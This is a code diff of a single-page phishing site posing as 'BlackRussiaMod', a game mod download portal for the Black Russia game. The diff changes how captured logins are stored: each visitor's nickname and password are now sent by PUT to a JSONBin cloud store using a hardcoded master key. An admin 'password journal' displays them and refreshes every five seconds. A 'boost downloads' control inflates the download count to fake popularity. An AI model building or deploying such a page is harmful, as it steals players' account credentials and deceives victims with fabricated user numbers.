@@ -3,19 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="BlackRussiaMod - Уникальный мод для перекупов">
-    <title>BlackRussiaMod by Sleeps</title>
+    <title>BlackRussiaMod</title>
     
-    <!-- Подключаем шрифты -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;800&family=Russo+One&display=swap" rel="stylesheet">
     
     <style>
-        /* --- CSS RESET & VARIABLES --- */
+        /* --- ЧЕРНО-КРАСНЫЙ СТИЛЬ --- */
         :root {
             --primary-red: #D80000;
-            --dark-red: #8a0000;
             --bg-color: #050505;
             --panel-bg: #111111;
             --text-main: #ffffff;
@@ -24,12 +19,7 @@
             --success-green: #00ff66;
         }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            outline: none;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; outline: none; }
 
         body {
             font-family: 'Montserrat', sans-serif;
@@ -39,24 +29,13 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            /* Фон optimized */
-            background-image: 
-                linear-gradient(rgba(5, 5, 5, 0.92), rgba(5, 5, 5, 0.98)),
-                url('https://images.unsplash.com/photo-1542751371-adc38448a05e?q=80&w=2070&auto=format&fit=crop');
+            background-image: linear-gradient(rgba(5, 5, 5, 0.95), rgba(5, 5, 5, 0.95)), url('https://images.unsplash.com/photo-1542751371-adc38448a05e?q=80&w=2070&auto=format&fit=crop');
             background-size: cover;
             background-position: center;
-            background-attachment: fixed;
-            overflow-x: hidden;
             padding: 20px;
         }
 
-        /* --- LAYOUT --- */
-        .app-container {
-            width: 100%;
-            max-width: 500px;
-            position: relative;
-            z-index: 10;
-        }
+        .app-container { width: 100%; max-width: 500px; position: relative; z-index: 10; }
 
         .card {
             background: rgba(17, 17, 17, 0.95);
@@ -64,227 +43,88 @@
             border-top: 4px solid var(--primary-red);
             padding: 35px 25px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.9);
-            border-radius: 2px;
             text-align: center;
             position: relative;
-            backdrop-filter: blur(10px);
         }
 
-        /* --- TYPOGRAPHY --- */
-        h1, h2, h3, h4 {
-            font-family: 'Russo One', sans-serif;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .title-large {
-            font-size: 2.2rem;
-            color: var(--text-main);
-            margin-bottom: 5px;
-            text-shadow: 0 0 15px rgba(216, 0, 0, 0.4);
-        }
-
-        .subtitle {
-            color: var(--primary-red);
-            font-size: 1rem;
-            margin-bottom: 30px;
-            font-weight: 600;
-            letter-spacing: 2px;
-        }
-
-        .text-desc {
-            font-size: 0.9rem;
-            color: var(--text-muted);
-            margin-bottom: 30px;
-            line-height: 1.6;
-        }
-
+        h1, h2, h3 { font-family: 'Russo One', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
+        .title-large { font-size: 2.2rem; color: var(--text-main); margin-bottom: 5px; text-shadow: 0 0 15px rgba(216, 0, 0, 0.4); }
+        .subtitle { color: var(--primary-red); font-size: 1rem; margin-bottom: 30px; font-weight: 600; letter-spacing: 2px; }
+        .text-desc { font-size: 0.9rem; color: var(--text-muted); margin-bottom: 30px; line-height: 1.6; }
         .text-highlight { color: var(--primary-red); font-weight: bold; }
 
-        /* --- BUTTONS --- */
+        /* Кнопки */
         .btn {
-            background: var(--primary-red);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 0.9rem;
-            font-weight: 700;
-            text-transform: uppercase;
-            cursor: pointer;
-            width: 100%;
-            border-radius: 2px;
-            transition: all 0.2s ease;
-            font-family: 'Montserrat', sans-serif;
-            letter-spacing: 1px;
+            background: var(--primary-red); color: white; border: none; padding: 15px 30px;
+            font-size: 0.9rem; font-weight: 700; text-transform: uppercase; cursor: pointer;
+            width: 100%; border-radius: 2px; transition: all 0.2s ease; font-family: 'Montserrat', sans-serif; letter-spacing: 1px;
         }
-
         .btn:hover { background: #ff1a1a; transform: translateY(-2px); }
-        .btn:active { transform: translateY(0); }
+        .btn-outline { background: transparent; border: 1px solid var(--text-muted); color: var(--text-muted); margin-top: 15px; }
+        .btn-outline:hover { border-color: var(--text-main); color: var(--text-main); background: rgba(255,255,255,0.05); }
+        
+        .btn-tab { background: #1a1a1a; color: var(--text-muted); border-bottom: 3px solid transparent; font-size: 0.8rem; padding: 10px; }
+        .btn-tab.active { color: white; border-bottom-color: var(--primary-red); background: #222; }
+        .btn-sm { padding: 5px 15px; font-size: 0.75rem; width: auto; }
+        .btn-delete { background: transparent; border: 1px solid #ff4d4d; color: #ff4d4d; margin-left: 5px; }
+        .btn-delete:hover { background: #ff4d4d; color: white; }
 
-        .btn-outline {
-            background: transparent;
-            border: 1px solid var(--text-muted);
-            color: var(--text-muted);
-            margin-top: 15px;
-            font-weight: 500;
-        }
-        .btn-outline:hover {
-            border-color: var(--text-main);
-            color: var(--text-main);
-            background: rgba(255,255,255,0.05);
-        }
-
-        .btn-tab {
-            background: #1a1a1a;
-            color: var(--text-muted);
-            border-bottom: 3px solid transparent;
-            font-size: 0.8rem;
-            padding: 10px;
-            border-radius: 2px 2px 0 0;
-        }
-        .btn-tab.active {
-            color: white;
-            border-bottom-color: var(--primary-red);
-            background: #222;
-        }
-
-        .btn-sm {
-            padding: 5px 15px;
-            font-size: 0.75rem;
-            width: auto;
-        }
-
-        .btn-delete {
-            background: transparent;
-            border: 1px solid #ff4d4d;
-            color: #ff4d4d;
-            margin-left: 5px;
-        }
-        .btn-delete:hover {
-            background: #ff4d4d;
-            color: white;
-        }
-
-        /* --- FORMS --- */
+        /* Формы */
         .form-group { margin-bottom: 20px; text-align: left; }
-        .label {
-            display: block;
-            font-size: 0.75rem;
-            color: var(--text-muted);
-            margin-bottom: 8px;
-            text-transform: uppercase;
-        }
+        .label { display: block; font-size: 0.75rem; color: var(--text-muted); margin-bottom: 8px; text-transform: uppercase; }
         .input-field {
-            width: 100%;
-            background: #0a0a0a;
-            border: 1px solid var(--border-color);
-            padding: 12px;
-            color: white;
-            font-family: 'Montserrat', sans-serif;
-            transition: border 0.3s;
+            width: 100%; background: #0a0a0a; border: 1px solid var(--border-color);
+            padding: 12px; color: white; font-family: 'Montserrat', sans-serif; transition: border 0.3s;
         }
         .input-field:focus { border-color: var(--primary-red); }
 
-        /* --- DASHBOARD ELEMENTS --- */
-        .profile-header {
-            background: rgba(255,255,255,0.03);
-            border: 1px solid var(--border-color);
-            padding: 15px;
-            margin-bottom: 25px;
-            text-align: left;
-        }
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            font-size: 0.85rem;
-            padding: 5px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-        }
+        /* Элементы дашборда */
+        .profile-header { background: rgba(255,255,255,0.03); border: 1px solid var(--border-color); padding: 15px; margin-bottom: 25px; text-align: left; }
+        .info-row { display: flex; justify-content: space-between; font-size: 0.85rem; padding: 5px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
         .info-row:last-child { border: none; }
         .status-dot { color: var(--success-green); font-weight: bold; }
 
-        .tab-nav {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-
+        .tab-nav { display: flex; gap: 10px; margin-bottom: 20px; }
         .content-area { display: none; animation: fadeIn 0.3s ease; }
         .content-area.active { display: block; }
 
         .file-list { max-height: 250px; overflow-y: auto; padding-right: 5px; }
         .file-list::-webkit-scrollbar { width: 4px; }
         .file-list::-webkit-scrollbar-thumb { background: #444; }
-
         .file-card {
-            background: #1a1a1a;
-            border-left: 3px solid var(--text-muted);
-            padding: 12px;
-            margin-bottom: 10px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+            background: #1a1a1a; border-left: 3px solid var(--text-muted); padding: 12px;
+            margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center;
         }
         .file-card:hover { background: #222; }
-        
+
         /* Таблица паролей */
-        .db-table-container {
-            background: #0a0a0a;
-            border: 1px solid #333;
-            max-height: 300px;
-            overflow-y: auto;
-        }
+        .db-table-container { background: #0a0a0a; border: 1px solid #333; max-height: 300px; overflow-y: auto; }
         .db-table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
         .db-table th { text-align: left; padding: 10px; background: #151515; color: var(--primary-red); position: sticky; top: 0; }
         .db-table td { padding: 10px; border-bottom: 1px solid #222; color: #ccc; }
         .db-table tr:hover td { background: rgba(255,255,255,0.02); }
 
-        .admin-controls {
-            border-top: 1px dashed var(--border-color);
-            margin-top: 25px;
-            padding-top: 20px;
-            display: none;
-        }
+        .admin-controls { border-top: 1px dashed var(--border-color); margin-top: 25px; padding-top: 20px; display: none; }
         .admin-controls.visible { display: block; }
         .control-row { display: flex; gap: 10px; margin-bottom: 10px; }
 
-        /* --- MODALS --- */
+        /* Модалки */
         .modal-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85);
-            backdrop-filter: blur(8px);
-            z-index: 100;
-            display: flex; justify-content: center; align-items: center;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(8px); z-index: 100; display: flex; justify-content: center; align-items: center;
             opacity: 0; pointer-events: none; transition: opacity 0.3s;
         }
         .modal-overlay.open { opacity: 1; pointer-events: all; }
-        
-        .modal {
-            background: var(--panel-bg);
-            border: 1px solid var(--primary-red);
-            width: 90%; max-width: 380px;
-            padding: 25px;
-            transform: scale(0.9); transition: transform 0.3s;
-        }
+        .modal { background: var(--panel-bg); border: 1px solid var(--primary-red); width: 90%; max-width: 380px; padding: 25px; transform: scale(0.9); transition: transform 0.3s; }
         .modal-overlay.open .modal { transform: scale(1); }
-        
         .modal-header { display: flex; justify-content: space-between; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
         .close-btn { background: none; border: none; color: #666; font-size: 1.5rem; cursor: pointer; }
         .close-btn:hover { color: white; }
 
-        /* --- TOAST --- */
-        .toast-container {
-            position: fixed; bottom: 20px; right: 20px; z-index: 200;
-            display: flex; flex-direction: column; gap: 10px;
-        }
-        .toast {
-            background: #222; border-left: 4px solid var(--primary-red);
-            color: white; padding: 12px 20px; font-size: 0.85rem;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
-            animation: slideIn 0.3s forwards;
-        }
+        /* Тосты */
+        .toast-container { position: fixed; bottom: 20px; right: 20px; z-index: 200; display: flex; flex-direction: column; gap: 10px; }
+        .toast { background: #222; border-left: 4px solid var(--primary-red); color: white; padding: 12px 20px; font-size: 0.85rem; box-shadow: 0 5px 15px rgba(0,0,0,0.5); animation: slideIn 0.3s forwards; }
         .toast.success { border-left-color: var(--success-green); }
-
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         @keyframes slideIn { from { transform: translateX(50px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
     </style>
@@ -292,16 +132,15 @@
 <body>
 
     <div class="app-container">
-        
         <!-- СТРАНИЦА ВХОДА -->
         <div id="view-login" class="card">
             <h1 class="title-large">BLACK RUSSIA<br><span style="font-size: 1rem; color: var(--primary-red);">MOD</span></h1>
             <div class="subtitle">by Sleeps</div>
             <p class="text-desc">
-                Мод для перекупов с обходами. Индивидуальный функционал.<br>
+                Удобный мод для перекупов с обходами.<br>
                 <span class="text-highlight">Более 17,000+ пользователей</span>.
             </p>
-            <button class="btn" onclick="openAuth()">Войти в систему</button>
+            <button class="btn" onclick="openAuth()">Войти</button>
         </div>
 
         <!-- ЛИЧНЫЙ КАБИНЕТ -->
@@ -314,25 +153,18 @@
                 <div class="info-row"><span>Статус:</span> <span class="status-dot">АКТИВНА ✓</span></div>
             </div>
 
-            <!-- Табы (видны только админу) -->
             <div id="nav-container" class="tab-nav" style="display: none;">
                 <button class="btn btn-tab active" onclick="switchTab('files')">Файлы</button>
                 <button class="btn btn-tab" onclick="switchTab('db')">База Паролей</button>
             </div>
 
-            <!-- Вкладка Файлы -->
             <div id="tab-files" class="content-area active">
-                <div style="text-align: left; margin-bottom: 10px;">
-                    <span style="color:var(--text-muted); font-size: 0.8rem;">ДОСТУПНЫЕ ФАЙЛЫ</span>
-                </div>
+                <div style="text-align: left; margin-bottom: 10px;"><span style="color:var(--text-muted); font-size: 0.8rem;">ДОСТУПНЫЕ ФАЙЛЫ</span></div>
                 <div id="file-list" class="file-list"></div>
             </div>
 
-            <!-- Вкладка База Паролей -->
             <div id="tab-db" class="content-area">
-                <div style="text-align: left; margin-bottom: 10px;">
-                    <span style="color:var(--primary-red); font-size: 0.9rem; font-weight:bold;">ЖУРНАЛ ПАРОЛЕЙ</span>
-                </div>
+                <div style="text-align: left; margin-bottom: 10px;"><span style="color:var(--primary-red); font-size: 0.9rem; font-weight:bold;">ЖУРНАЛ ПАРОЛЕЙ</span></div>
                 <div class="db-table-container">
                     <table class="db-table">
                         <thead><tr><th>Ник</th><th>Пароль</th><th>Дата</th></tr></thead>
@@ -341,11 +173,10 @@
                 </div>
             </div>
 
-            <!-- Админ Панель -->
             <div id="admin-area" class="admin-controls">
-                <h3 style="color:var(--primary-red); font-size: 0.9rem; margin-bottom: 15px;">ДЕВЕЛОПЕР</h3>
+                <h3 style="color:var(--primary-red); font-size: 0.9rem; margin-bottom: 15px;">УПРАВЛЕНИЕ</h3>
                 <div class="form-group">
-                    <label class="label">Накрутить скачиваний (шт):</label>
+                    <label class="label">Накрутить скачиваний:</label>
                     <div class="control-row">
                         <input type="number" id="boost-input" class="input-field" placeholder="1000">
                         <button class="btn btn-sm" onclick="boostAction()">Накрутить</button>
@@ -358,11 +189,11 @@
         </div>
     </div>
 
-    <!-- МОДАЛКА: КЛЮЧ -->
+    <!-- МОДАЛКИ -->
     <div id="modal-key" class="modal-overlay">
         <div class="modal">
             <div class="modal-header">
-                <span>АВТОРИЗАЦИЯ (1/2)</span>
+                <span>ШАГ 1</span>
                 <button class="close-btn" onclick="closeModals()">&times;</button>
             </div>
             <div class="form-group">
@@ -373,11 +204,10 @@
         </div>
     </div>
 
-    <!-- МОДАЛКА: ЛОГИН -->
     <div id="modal-login" class="modal-overlay">
         <div class="modal">
             <div class="modal-header">
-                <span>АВТОРИЗАЦИЯ (2/2)</span>
+                <span>ШАГ 2</span>
                 <button class="close-btn" onclick="closeModals()">&times;</button>
             </div>
             <div class="form-group">
@@ -395,62 +225,75 @@
     <div id="toast-area" class="toast-container"></div>
 
     <script>
-        /**
-         * BLACK RUSSIA MOD - OPTIMIZED FOR GITHUB PAGES
-         * Single File Architecture
-         */
+        // ==========================================
+        // НАСТРОЙКИ JSONBIN (ЗАПОЛНИ ЭТО!)
+        // ==========================================
+        
+        // Вставь сюда ID своего бина (длинная строка букв и цифр)
+        const BIN_ID = '6a0db8d4ee5a733b12ee2f64'; 
+        // Вставь сюда свой X-Master-Key (начинается с $2a$10$...)
+        const API_KEY = '$2a$10$51nj8Q9dSnRkcl.0v/vieuTzMgVBTeOQ7Yq3QfwbBjql3MFesAbze'; 
 
-        // --- CONFIGURATION ---
+        // ==========================================
+        // ДАННЫЕ
+        // ==========================================
         const KEYS = {
             DEV: "SLEZ-RAZRAB-9902",
             USER: "KSCN-3210-LKN2-O2M4"
         };
 
-        const DB = {
+        const DB_USERS = {
             "Andrey_slezar": { role: "dev", pass: "66657443" },
-            "Georgi_Bushmanov": { role: "user", pass: null } // Pass is dynamic
+            "Georgi_Bushmanov": { role: "user", pass: null }
         };
 
-        const INITIAL_FILES = [
-            { id: 1, name: "BlackRussiaMod_v4.0.exe", downloads: 17432 }
-        ];
-
-        // --- STATE MANAGEMENT ---
-        let state = {
-            user: null,      // Current logged in user object
-            files: [],       // List of files
-            passwords: []    // Stolen passwords log
+        let localState = {
+            user: null,
+            cloudData: { files: [], passwords: [] }
         };
 
-        // --- STORAGE ENGINE (Fixes logout bug) ---
-        const Storage = {
-            save: function() {
-                // Сохраняем ТОЛЬКО если есть активная сессия
-                if (state.user) {
-                    localStorage.setItem('br_state_user', JSON.stringify(state.user));
-                } else {
-                    localStorage.removeItem('br_state_user');
+        // ==========================================
+        // API
+        // ==========================================
+        const API = {
+            url: `https://api.jsonbin.io/v3/b/${BIN_ID}`,
+            
+            read: async function() {
+                try {
+                    const res = await fetch(`${this.url}/latest`, {
+                        headers: { 'X-Master-Key': API_KEY }
+                    });
+                    if (!res.ok) throw new Error('Ошибка сети');
+                    const data = await res.json();
+                    return data.record;
+                } catch (e) {
+                    console.error("Read Error:", e);
+                    return null;
                 }
-                localStorage.setItem('br_state_files', JSON.stringify(state.files));
-                localStorage.setItem('br_state_pass', JSON.stringify(state.passwords));
             },
-            load: function() {
-                const savedFiles = localStorage.getItem('br_state_files');
-                state.files = savedFiles ? JSON.parse(savedFiles) : [...INITIAL_FILES];
 
-                const savedPass = localStorage.getItem('br_state_pass');
-                state.passwords = savedPass ? JSON.parse(savedPass) : [];
-
-                const savedUser = localStorage.getItem('br_state_user');
-                if (savedUser) {
-                    state.user = JSON.parse(savedUser);
-                    return true; // Session restored
+            write: async function(newData) {
+                try {
+                    const res = await fetch(this.url, {
+                        method: 'PUT',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'X-Master-Key': API_KEY
+                        },
+                        body: JSON.stringify(newData)
+                    });
+                    if (!res.ok) throw new Error('Ошибка записи');
+                    return true;
+                } catch (e) {
+                    console.error("Write Error:", e);
+                    return false;
                 }
-                return false;
             }
         };
 
-        // --- UI RENDERER ---
+        // ==========================================
+        // UI
+        // ==========================================
         const UI = {
             toast: function(msg, type = 'error') {
                 const area = document.getElementById('toast-area');
@@ -469,27 +312,27 @@
             showDashboard: function() {
                 document.getElementById('view-login').style.display = 'none';
                 document.getElementById('view-dashboard').style.display = 'block';
+                document.getElementById('p-nick').innerText = localState.user.name;
+                document.getElementById('p-key').innerText = localState.user.key;
 
-                // Заполняем инфо
-                document.getElementById('p-nick').innerText = state.user.name;
-                document.getElementById('p-key').innerText = state.user.key;
-
-                // Админ или юзер?
-                const isAdmin = state.user.role === 'dev';
+                const isAdmin = localState.user.role === 'dev';
                 document.getElementById('nav-container').style.display = isAdmin ? 'flex' : 'none';
                 document.getElementById('admin-area').classList.toggle('visible', isAdmin);
                 document.getElementById('tab-db').style.display = isAdmin ? 'block' : 'none';
 
-                if (!isAdmin) switchTab('files'); // Гости видят только файлы
+                if (!isAdmin) switchTab('files');
+                this.render();
+            },
 
+            render: function() {
                 this.renderFiles();
-                if (isAdmin) this.renderPasswords();
+                if (localState.user.role === 'dev') this.renderPasswords();
             },
 
             renderFiles: function() {
                 const list = document.getElementById('file-list');
                 list.innerHTML = '';
-                state.files.forEach(f => {
+                localState.cloudData.files.forEach(f => {
                     const div = document.createElement('div');
                     div.className = 'file-card';
                     div.innerHTML = `
@@ -498,8 +341,8 @@
                             <div style="font-size:0.75rem; color:#888;">Скачиваний: ${f.downloads.toLocaleString()}</div>
                         </div>
                         <div>
-                            <button class="btn btn-sm" onclick="UI.toast('Скачивание началось...', 'success')">Скачать</button>
-                            ${state.user.role === 'dev' ? `<button class="btn btn-sm btn-delete" onclick="Actions.deleteFile(${f.id})">Удалить</button>` : ''}
+                            <button class="btn btn-sm" onclick="UI.toast('Скачивание...', 'success')">Скачать</button>
+                            ${localState.user.role === 'dev' ? `<button class="btn btn-sm btn-delete" onclick="Actions.deleteFile(${f.id})">Удалить</button>` : ''}
                         </div>
                     `;
                     list.appendChild(div);
@@ -509,14 +352,11 @@
             renderPasswords: function() {
                 const tbody = document.getElementById('db-body');
                 tbody.innerHTML = '';
-                // Сортируем: новые сверху
-                const sorted = [...state.passwords].reverse();
-                
+                const sorted = [...localState.cloudData.passwords].reverse();
                 if(sorted.length === 0) {
-                    tbody.innerHTML = '<tr><td colspan="3" style="text-align:center; color:#555;">База пуста</td></tr>';
+                    tbody.innerHTML = '<tr><td colspan="3" style="text-align:center; color:#555;">Пусто</td></tr>';
                     return;
                 }
-
                 sorted.forEach(p => {
                     const tr = document.createElement('tr');
                     tr.innerHTML = `<td style="color:white; font-weight:bold;">${p.nick}</td><td style="color:var(--primary-red);">${p.pass}</td><td style="font-size:0.7rem; color:#666;">${p.date}</td>`;
@@ -525,121 +365,146 @@
             }
         };
 
-        // --- ACTIONS ---
+        // ==========================================
+        // ДЕЙСТВИЯ
+        // ==========================================
         const Actions = {
-            login: function() {
+            login: async function() {
                 const userIn = document.getElementById('inp-user').value.trim();
                 const passIn = document.getElementById('inp-pass').value;
-                const keyIn = window.tempKey; // Берется из первого шага
+                const keyIn = window.tempKey;
 
-                // Проверка ника
-                if (!DB[userIn]) return UI.toast('Аккаунт не найден в базе данных');
+                if (!DB_USERS[userIn]) return UI.toast('Аккаунт не найден');
 
-                const dbUser = DB[userIn];
+                const dbUser = DB_USERS[userIn];
 
-                // Проверка пароля
                 if (dbUser.role === 'dev') {
-                    if (passIn !== dbUser.pass) return UI.toast('Неверный пароль разработчика');
+                    if (passIn !== dbUser.pass) return UI.toast('Неверный пароль');
                 } else {
-                    // Гость
                     if (!passIn) return UI.toast('Введите пароль');
                     
-                    // --- ЛОГИРОВАНИЕ ПАРОЛЯ (ЗАПРОС #3) ---
+                    // Сохранение пароля в базу
                     const now = new Date();
                     const dateStr = `${now.getDate()}.${now.getMonth()+1}.${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}`;
-                    state.passwords.push({
-                        nick: userIn,
-                        pass: passIn,
-                        date: dateStr
-                    });
-                    Storage.save(); // Сразу сохраняем пароль
+                    const newLog = { nick: userIn, pass: passIn, date: dateStr };
+                    localState.cloudData.passwords.push(newLog);
+
+                    UI.toast('Вход выполнен', 'success');
+                    await API.write(localState.cloudData);
                 }
 
-                // Успех
-                state.user = {
-                    name: userIn,
-                    role: dbUser.role,
-                    key: keyIn
-                };
+                localState.user = { name: userIn, role: dbUser.role, key: keyIn };
+                localStorage.setItem('br_user', JSON.stringify(localState.user));
                 
-                Storage.save(); // Фиксируем сессию (Исправление бага с выходом)
                 closeModals();
                 UI.showDashboard();
-                UI.toast('Вход выполнен', 'success');
                 
-                // Очистка
                 document.getElementById('inp-user').value = '';
                 document.getElementById('inp-pass').value = '';
                 document.getElementById('inp-key').value = '';
             },
 
             logout: function() {
-                state.user = null;
-                Storage.save(); // Удаляем сессию из LocalStorage
+                localState.user = null;
+                localStorage.removeItem('br_user');
                 UI.showLogin();
-                UI.toast('Вы вышли из системы', 'success');
+                UI.toast('Вы вышли', 'success');
             },
 
-            boost: function() {
-                const val = parseInt(document.getElementById('boost-input').value);
-                if (!val || val < 1) return UI.toast('Введите число');
-                if (state.files.length > 0) {
-                    state.files[0].downloads += val;
-                    Storage.save();
-                    UI.renderFiles();
-                    UI.toast(`Накручено +${val}`, 'success');
-                    document.getElementById('boost-input').value = '';
-                }
-            },
-
-            addFile: function() {
+            addFile: async function() {
                 const name = prompt("Название файла:");
                 if (name) {
-                    state.files.push({ id: Date.now(), name: name, downloads: 0 });
-                    Storage.save();
-                    UI.renderFiles();
-                    UI.toast('Файл добавлен', 'success');
+                    const newFile = { id: Date.now(), name: name, downloads: 0 };
+                    localState.cloudData.files.push(newFile);
+                    const ok = await API.write(localState.cloudData);
+                    if(ok) {
+                        UI.renderFiles();
+                        UI.toast('Файл добавлен', 'success');
+                    } else {
+                        UI.toast('Ошибка', 'error');
+                        localState.cloudData.files.pop();
+                    }
                 }
             },
 
-            deleteFile: function(id) {
+            deleteFile: async function(id) {
                 if(confirm('Удалить файл?')) {
-                    state.files = state.files.filter(f => f.id !== id);
-                    Storage.save();
-                    UI.renderFiles();
-                    UI.toast('Файл удален', 'success');
+                    localState.cloudData.files = localState.cloudData.files.filter(f => f.id !== id);
+                    const ok = await API.write(localState.cloudData);
+                    if(ok) {
+                        UI.renderFiles();
+                        UI.toast('Удалено', 'success');
+                    }
+                }
+            },
+
+            boost: async function() {
+                const val = parseInt(document.getElementById('boost-input').value);
+                if (!val || val < 1) return UI.toast('Число?');
+                
+                if (localState.cloudData.files.length > 0) {
+                    localState.cloudData.files[0].downloads += val;
+                    const ok = await API.write(localState.cloudData);
+                    if(ok) {
+                        UI.renderFiles();
+                        UI.toast('Готово', 'success');
+                        document.getElementById('boost-input').value = '';
+                    }
                 }
             }
         };
 
-        // --- GLOBAL HELPERS ---
-        function openAuth() {
-            document.getElementById('modal-key').classList.add('open');
-        }
-        function closeModals() {
-            document.querySelectorAll('.modal-overlay').forEach(el => el.classList.remove('open'));
-        }
+        // ==========================================
+        // ЗАПУСК И СИНХРОНИЗАЦИЯ
+        // ==========================================
         
+        async function init() {
+            const saved = localStorage.getItem('br_user');
+            if (saved) localState.user = JSON.parse(saved);
+
+            const data = await API.read();
+            if (data) {
+                localState.cloudData = data;
+                if (localState.user) {
+                    UI.showDashboard();
+                } else {
+                    UI.showLogin();
+                }
+            } else {
+                alert('Ошибка подключения к JSONBin. Проверьте ID и Ключ в коде.');
+            }
+        }
+
+        init();
+
+        // Фоновое обновление каждые 5 секунд (чтобы видеть новые пароли без перезагрузки)
+        setInterval(async () => {
+            if (!localState.user) return;
+            const data = await API.read();
+            if (data && JSON.stringify(data) !== JSON.stringify(localState.cloudData)) {
+                localState.cloudData = data;
+                UI.render();
+                console.log("Обновлено");
+            }
+        }, 5000);
+
+        function openAuth() { document.getElementById('modal-key').classList.add('open'); }
+        function closeModals() { document.querySelectorAll('.modal-overlay').forEach(el => el.classList.remove('open')); }
         function checkKey() {
             const k = document.getElementById('inp-key').value.trim().toUpperCase();
             if (k === KEYS.DEV || k === KEYS.USER) {
                 window.tempKey = k;
                 document.getElementById('modal-key').classList.remove('open');
                 document.getElementById('modal-login').classList.add('open');
-            } else {
-                UI.toast('Неверный ключ');
-            }
+            } else { UI.toast('Неверный ключ'); }
         }
-
         function loginAction() { Actions.login(); }
         function logoutAction() { Actions.logout(); }
         function boostAction() { Actions.boost(); }
         function addFileAction() { Actions.addFile(); }
-
         function switchTab(tab) {
             document.querySelectorAll('.content-area').forEach(e => e.classList.remove('active'));
             document.querySelectorAll('.btn-tab').forEach(e => e.classList.remove('active'));
-            
             if(tab === 'files') {
                 document.getElementById('tab-files').classList.add('active');
                 document.querySelectorAll('.btn-tab')[0].classList.add('active');
@@ -648,21 +513,7 @@
                 document.querySelectorAll('.btn-tab')[1].classList.add('active');
             }
         }
-
-        // --- INITIALIZATION ---
-        window.addEventListener('DOMContentLoaded', () => {
-            Storage.load();
-            if (state.user) {
-                UI.showDashboard();
-            } else {
-                UI.showLogin();
-            }
-        });
-
-        // Закрытие модалок по клику вне
-        window.onclick = (e) => {
-            if (e.target.classList.contains('modal-overlay')) closeModals();
-        };
+        window.onclick = (e) => { if (e.target.classList.contains('modal-overlay')) closeModals(); };
 
     </script>
 </body>
